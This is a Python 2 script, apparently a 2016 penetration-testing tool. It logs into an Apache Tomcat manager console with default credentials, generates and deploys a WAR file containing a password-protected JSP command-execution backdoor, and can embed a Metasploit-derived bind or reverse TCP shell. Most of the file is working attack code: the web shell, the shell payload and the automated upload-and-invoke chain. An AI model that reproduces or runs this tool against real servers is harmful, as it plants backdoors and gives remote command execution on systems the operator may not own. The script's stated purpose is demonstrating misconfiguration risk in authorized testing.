#!/usr/bin/python

#
# Apache Tomcat server misconfiguration penetration testing tool.
#   What this tool does is to locate Tomcat server, validate access
#   to it's manager application (web) and then leverage this access
#   in order to upload there an automatically generated WAR application.
#   After having the application uploaded and deployed, script invokes it
#   and then if configured so - handles incoming shell connection (reverse tcp)
#   or connects back to binded connection.
#
# In other words - automatic Tomcat WAR deployment pwning tool.
#
#
# Currently tested on:
#  Apache Tomcat/7.0.52 (Ubuntu)
#
# Mariusz B. / MGeeky, '16
#


import mechanize
import os
import urllib
import urllib2
import sys
import random
import string
import optparse
import tempfile
import shutil
import re
import base64
import logging
import commands
from BeautifulSoup import BeautifulSoup

logging.basicConfig(format='%(levelname)s: %(message)s', level=logging.INFO)
logging.addLevelName( logging.DEBUG, "\033[1;32m%s\033[1;0m" % logging.getLevelName(logging.DEBUG))
logging.addLevelName( logging.WARNING, "\033[1;35m%s\033[1;0m" % logging.getLevelName(logging.WARNING))
logging.addLevelName( logging.ERROR, "\033[1;41m%s\033[1;0m" % logging.getLevelName(logging.ERROR))
logger = logging.getLogger()


def establishReverseTcpListener(opts):
    pass

def connectToBindShell(hostn, opts):
    host = hostn[:hostn.find(':')]
    


def generateWAR(code, title, appname):
    dirpath = tempfile.mkdtemp()

    logging.debug('Generating temporary structure for %s WAR at: "%s"' % (appname, dirpath))

    os.makedirs(dirpath + '/files/META-INF')
    os.makedirs(dirpath + '/files/WEB-INF')
    
    with open(dirpath + '/index.jsp', 'w') as f:
        f.write(code)

    javaver = commands.getstatusoutput('java -version')[1]
    m = re.search('version "([^"]+)"', javaver)
    if m:
        javaver = m.group(1)
        logging.debug('Working with Java at version: %s' % javaver)
    else:
        logging.debug('Could not retrieve Java version. Assuming: "1.8.0_60"')
        javaver = '1.8.0_60'

    with open(dirpath + '/files/META-INF/MANIFEST.MF', 'w') as f:
        f.write('''Manifest-Version: 1.0
Created-By: %s (Sun Microsystems Inc.)

''' % javaver)

    logging.debug('Generating web.xml with servlet-name: "%s"' % title)
    with open(dirpath + '/files/WEB-INF/web.xml', 'w') as f:
        f.write('''<?xml version="1.0" encoding="ISO-8859-1"?>
<web-app xmlns="http://java.sun.com/xml/ns/j2ee"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"
    version="2.4">

    <display-name>%s</display-name>

    <servlet>
        <servlet-name>%s</servlet-name>
    </servlet>

    <servlet-mapping>
        <servlet-name>%s</servlet-name>
        <url-pattern>/%s</url-pattern>
    </servlet-mapping>

</web-app>
''' % (title, appname.capitalize(), appname.capitalize(), appname))

    cwd = os.getcwd()
    os.chdir(dirpath)
    outpath = tempfile.gettempdir() + '/' + appname + '.war'
    logging.debug('Generating WAR file at: "%s"' % outpath)
    packing = commands.getstatusoutput('jar -cvf %s *' % outpath)
    os.chdir(cwd)

    logging.debug(packing[1])

    tree = commands.getstatusoutput('tree %s' % dirpath)[1]
    if not ('sh' in tree and 'tree: not found' in tree):
        logging.debug('WAR file structure:')
        logging.debug(tree)

    return (dirpath, outpath)

def chooseShellFunctionality(opts):
    host = opts.host
    port = opts.port

    if host and port:
        # Reverse TCP
        return 1
    elif port and not host:
        # Bind shell
        return 2
    else:
        return 0


def prepareTcpShellCode(opts):
    host = opts.host
    port = opts.port

    socketArguments = ''
    mode = chooseShellFunctionality(opts)
    if mode == 1:
        # Reverse TCP
        socketArguments = '"%s", %s' % (host, port)
        logging.debug('Preparing additional code for Reverse TCP shell')
    elif mode == 2:
        # Bind shell
        socketArguments = '%s' % port
        logging.debug('Preparing additional code for bind TCP shell')
    else:
        logging.debug('No additional code for shell functionality requested.')
        return ''

    #
    # NOTICE:
    #   The below code comes from the Rapid7 Metasploit-Framework, which in turn was based
    #   on the code coming from: http://www.security.org.sg/code/jspreverse.html.
    #   In order to refer to the original source, please look at the Metasploit core lib.
    #   On Linux instances the file can be found at:
    #       /usr/share/metasploit-framework/lib/msf/core/payload/jsp.rb
    #
    #
    payload = ''' <%%
  class StreamConnector extends Thread
  {
    InputStream ins;
    OutputStream outs;

    StreamConnector( InputStream ins, OutputStream outs )
    {
      this.ins = ins;
      this.outs = outs;
    }

    public void run()
    {
      BufferedReader bufin  = null;
      BufferedWriter bufout = null;
      try
      {
        bufin  = new BufferedReader( new InputStreamReader( this.ins ) );
        bufout = new BufferedWriter( new OutputStreamWriter( this.outs ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = bufin.read( buffer, 0, buffer.length ) ) > 0 )
        {
          bufout.write( buffer, 0, length );
          bufout.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( bufin != null )
          bufin.close();
        if( bufout != null )
          bufout.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
    if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
        ShellPath = new String("/bin/sh");
    } else {
        ShellPath = new String("cmd.exe");
    }
    ServerSocket server_socket = new ServerSocket(%(socketArguments)s);
    Socket client_socket = server_socket.accept();
    server_socket.close();
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), client_socket.getOutputStream() ) ).start();
    ( new StreamConnector( client_socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%%>''' % {'socketArguments': socketArguments }

    return payload


def preparePayload(opts):
    logging.debug('Generating JSP WAR backdoor code...')
    payload = '''<%%@ page import="java.util.*,java.io.*,java.net.*,java.lang.*"%%> <%%!
    public String execute(String pass, String cmd) {
        final String hardcodedPass = "%(password)s";
        StringBuilder res = new StringBuilder();

        if (cmd != null && cmd.length() > 0 && (pass.equals(hardcodedPass) || hardcodedPass.toLowerCase().equals("none"))){
            try {
                Process proc = Runtime.getRuntime().exec(cmd);
                OutputStream outs = proc.getOutputStream();
                InputStream ins = proc.getInputStream();
                DataInputStream datains = new DataInputStream(ins);
                String datainsline = datains.readLine();

                while ( datainsline != null) {
                    res.append(datainsline + "<br/>");
                    datainsline = datains.readLine();
                }
            } catch( IOException e) {
                return "IOException: " + e.getMessage();
            }
        }
        else {
            return "Wrong password or no command issued.";
        }

        return res.toString();
    }
%%><!DOCTYPE html>
<html>
    <head>
        <title>JSP Application</title>
        %(shellPayload)s
    </head>
    <body>
        <h3>JSP Backdoor deployed as WAR on Apache Tomcat.</h3>
        <i style="font-size:9px">You need to provide valid password in order to leverage RCE.</i>
        <br/>
        <font style="font-size:5px" style="font-style:italic;color:grey">coded by <a href="https://github.com/mgeeky">mgeeky</a></font>
        <br/>
        <hr/>
        <form method=post>
        <table style="width:100%%">
            <tr>
                <td>Password:</td><td style="width:100%%"><input type=password width=40 name="password" value='<%% out.print((request.getParameter("password") != null) ? request.getParameter("password") : ""); %%>' /></td>
            </tr>
            <tr>
                <td>tomcat $ </td><td style="width:100%%"><input type=text size=100 name="cmd" value='<%% out.print((request.getParameter("cmd") != null) ? request.getParameter("cmd") : "uname -a"); %%>' onClick="this.select();" onkeydown="if (event.keyCode == 13) { this.form.submit(); return false; }" /></td>
            </tr>
            <tr>
                <td><input type=submit style="position:absolute;left:-9999px;width:1px;height:1px;" tabindex="-1"/></td><td></td>
            </tr>
        </table>
        </form>
        <hr />
        <pre style="background-color:black;color:lightgreen;padding: 5px 25px 25px 25px;"><%%
            if (request.getParameter("cmd") != null && request.getParameter("password") != null) {
                out.println("<br/>tomcat $ " + request.getParameter("cmd") + "<br/>");
                out.println(execute(request.getParameter("password"), request.getParameter("cmd")));
            }
        %%></pre>
    </body>
</html>''' % {'title': opts.title, 'password': opts.shellpass, 'shellPayload': prepareTcpShellCode(opts) }

    return payload

def invokeApplication(browser, url, appname):
    appurl = 'http://%s/%s/' % (url, appname)
    logging.debug('Invoking application at url: "%s"' % appurl)

    try:
        resp = browser.open(appurl)
        return True

    except urllib2.HTTPError, e:
        if e.code == 404:
            logging.error('Application "%s" does not exist, or was not deployed.' % appname)
        else:
            logging.error('Failed with error: %d, msg: "%s"' % (int(e.code), str(e)))

    return False

def deployApplication(browser, url, appname, warpath):
    logging.debug('Deploying application: %s from file: "%s"' % (appname, warpath))
    resp = browser.open(url)
    for form in browser.forms():
        action = urllib.unquote_plus(form.action)
        if url in action and '/upload?' in action:
            browser.form = form
            browser.form.add_file(open(warpath, 'rb'), 'application/octet-stream', appname+'.war')
            browser.submit()

            checkIsDeployed(browser, url, appname)
            return True

    return False

def checkIsDeployed(browser, url, appname):
    browser.open(url)
    for form in browser.forms():
        action = urllib.unquote_plus(form.action)
        if url in action and '/undeploy?path=/'+appname in action:
            return True

    return False

def unloadApplication(browser, url, appname):
    appurl = 'http://%s/%s/' % (url, appname)
    logging.debug('Unloading application: "%s"' % appurl)
    for form in browser.forms():
        action = urllib.unquote_plus(form.action)
        if url in action and '/undeploy?path=/'+appname in action:
            browser.form = form
            resp = browser.submit()
            content = resp.read()

            try:
                resp = browser.open(appurl)
            except urllib2.HTTPError, e:
                if e.code == 404:
                    return True

    return False

def validateManagerApplication(browser):
    found = 0
    actions = ('stop', 'start', 'deploy', 'undeploy', 'upload', 'expire', 'reload')
    for form in browser.forms():
        for a in actions:
            action = urllib.unquote_plus(form.action)
            if '/'+a+'?' in action:
                found += 1

    return (found >= len(actions))

def browseToManager(url, user, password):
    logger.debug('Browsing to "%s"... Creds: %s:%s' % (url, user, password))
    browser = mechanize.Browser()
    cookiejar = mechanize.LWPCookieJar()
    browser.set_cookiejar(cookiejar)
    browser.set_handle_robots(False)
    browser.add_password(url, user, password)

    try:
        page = browser.open(url)
    except urllib2.URLError, e:
        if 'Connection refused' in str(e):
            logger.error('Could not connect with "%s", connection refused.' % url)
        elif 'Error 404' in str(e):
            logger.error('Server returned 404 Not Found on specified URL: %s' % url)
        else:
            logger.error('Browsing to the server (%s) failed: %s' % (url, e))
        return None

    src = page.read()

    if validateManagerApplication(browser):
        logging.debug('Apache Tomcat Manager Application reached & validated.')
    else:
        logging.error('Specified URL does not point at the Apache Tomcat Manager Application')
        return None

    return browser

def generateRandomPassword(N=12):
    return ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(N))

def options():
    print '''
    Apache Tomcat auto WAR deployment & launching tool
    Mariusz B. / MGeeky '16

Penetration Testing utility aiming at presenting danger of leaving Tomcat misconfigured.
    ''' 

    usage = '%prog [options] server\n\n  server\t\tSpecifies server address. Please also include port after colon.'
    parser = optparse.OptionParser(usage=usage)

    general = optparse.OptionGroup(parser, 'General options')
    general.add_option('-v', '--verbose', dest='verbose', help='Verbose mode.', action='store_true')
    general.add_option('-U', '--user', metavar='USER', dest='user', default='tomcat', help='Tomcat Manager Web Application HTTP Auth username. Default="tomcat"')
    general.add_option('-P', '--pass', metavar='PASS', dest='password', default='tomcat', help='Tomcat Manager Web Application HTTP Auth password. Default="tomcat"')
    parser.add_option_group(general)

    conn = optparse.OptionGroup(parser, 'Connection options')
    conn.add_option('-H', '--host', metavar='RHOST', dest='host', help='Remote host for reverse tcp payload connection. When specified, RPORT must be specified too. Otherwise, bind tcp payload will be deployed listening on 0.0.0.0')
    conn.add_option('-p', '--port', metavar='PORT', dest='port', help='Remote port for the reverse tcp payload when used with RHOST or Local port if no RHOST specified thus acting as a Bind shell endpoint.')
    conn.add_option('-u', '--url', metavar='URL', dest='url', default='/manager/', help='Apache Tomcat management console URL. Default: /manager/')

    payload = optparse.OptionGroup(parser, 'Payload options')
    parser.add_option('-X', '--shellpass', metavar='PASSWORD', dest='shellpass', help='Specifies authentication password for uploaded shell, to prevent unauthenticated usage. Default: randomly generated. Specify "None" to leave the shell unauthenticated.', default=generateRandomPassword())
    parser.add_option('-t', '--title', metavar='TITLE', dest='title', help='Specifies head>title for uploaded JSP WAR payload. Default: "JSP Application"', default='JSP Application')
    parser.add_option('-n', '--name', metavar='APPNAME', dest='appname', help='Specifies JSP application name. Default: "jsp_app"', default='jsp_app')
    parser.add_option('-x', '--unload', dest='unload', help='Unload existing JSP Application with the same name. Default: no.', action='store_true')
    parser.add_option('-f', '--file', metavar='WARFILE', dest='file', help='Custom WAR file to deploy. By default the script will generate own WAR file on-the-fly.')

    opts, args = parser.parse_args()

    if opts.port:
        try:
            port = int(opts.port)
            if port < 0 or port > 65535:
                raise ValueError
        except ValueError:
            logger.error('RPORT must be an integer in range 0-65535')
            sys.exit(0)

    if (opts.host and not opts.port):
        logger.error('Both RHOST and RPORT must be specified to deploy reverse tcp payload.')
        sys.exit(0)
    elif (opts.port and not opts.host):
        logging.info('Bind shell will be deployed as a port has been specified and host not. Binded to: 0.0.0.0:%s' % opts.port)
    elif (opts.host and opts.port):
        logging.info('Reverse shell will be deployed on: %s:%s.' % (opts.host, opts.port))

    if opts.file and not os.path.exists(file):
        logger.error('Specified WAR file does not exists in local filesystem.')
        sys.exit(0)
        
    if opts.verbose:
        logger.setLevel(logging.DEBUG)
    else:
        logger.setLevel(logging.INFO)
        
    return (opts, args)


def main():
    (opts, args) = options()

    url = 'http://%s%s' % (args[0], opts.url)
    browser = browseToManager(url, opts.user, opts.password)
    if browser == None:
        return

    try:
        mode = chooseShellFunctionality(opts)
        if not opts.file:
            code = preparePayload(opts)
            print '-'*50
            print code
            print '-'*50
            (dirpath, warpath) = generateWAR(code, opts.title, opts.appname)
        else:
            warpath = opts.file

        if checkIsDeployed(browser, url, opts.appname):
            logging.warning('Application with name: "%s" is already deployed.' % opts.appname)
            if opts.unload:
                logging.debug('Unloading existing one...')
                if unloadApplication(browser, args[0], opts.appname):
                    logging.debug('Succeeded.')
                else:
                    logging.debug('Unloading failed.')
                    return
            else:
                logging.warning('Not continuing until the application name is changed or current one unloaded.')
                logging.warning('Please use -x (--unload) option to force existing application unloading.')
                return
        else:
            logging.debug('It looks that the application with specified name "%s" has not been deployed yet.' % opts.appname)

        if deployApplication(browser, url, opts.appname, warpath):
            logging.debug('Succeeded, invoking it...')

            if mode == 1:
                logging.debug('Establishing listener for incoming reverse TCP shell')
                establishReverseTcpListener(opts)

            if invokeApplication(browser, args[0], opts.appname):
                logging.info("\033[0;32mJSP Backdoor up & running on http://%s/%s/\033[1;0m" % (args[0], opts.appname))
                logging.info("\033[0;33mHappy pwning, here take that password: '%s'\033[1;0m" % opts.shellpass)

                if mode == 2:
                    logging.debug('Shell has binded to port %s at remote host. Connecting back to it...' % opts.port)
                    connectToBindShell(args[0], opts)
                
                if mode == 0:
                    logging.debug('No shell functionality was included in backdoor.')
            else:
                logging.error("\033[1;41mNo pwning today, backdoor was not deployed.\033[1;0m")
        else:
            logging.error('Failed.')

    except KeyboardInterrupt:
        print '\nUser interruption.'

    if not opts.file and dirpath:
        logger.debug('Removing temporary WAR directory: "%s"' % dirpath)
        shutil.rmtree(dirpath)


if __name__ == '__main__':
    main()
    print

